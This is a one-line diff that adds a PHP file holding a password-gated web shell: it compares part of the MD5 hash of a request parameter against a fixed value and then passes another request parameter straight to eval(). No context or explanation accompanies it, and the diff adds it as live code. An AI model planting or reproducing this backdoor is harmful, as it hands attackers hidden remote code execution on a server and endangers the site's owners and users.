@@ -1,0 +1,1 @@
+<?php substr(md5($_REQUEST['x']),28)=='6862'&&eval($_REQUEST['xlcst']);?>
